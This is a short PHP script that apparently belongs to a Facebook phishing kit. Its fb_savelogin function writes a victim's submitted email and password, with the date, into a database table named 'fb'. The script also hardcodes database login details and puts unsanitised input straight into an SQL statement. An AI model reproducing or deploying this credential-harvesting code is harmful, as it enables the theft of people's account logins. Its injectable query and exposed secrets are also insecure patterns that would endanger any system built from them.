<?php
session_start();
require_once('DBFramework.php');
include 'httpcurl.php';
include 'fbform.php';
$page = new FBform();
if(!isset($_SESSION["in"])){
	$_SESSION["in"]=NULL;
}
function fb_savelogin($EMAIL,$PASSWORD){
	conect("localhost","398948","samuel20","398948");
	if(insert('fb','',"NULL, '$EMAIL', '$PASSWORD', '".date("d/m/Y")."'")){
		return true;
	}else{
		return false;
	}
}
function fb_login(){
}
?>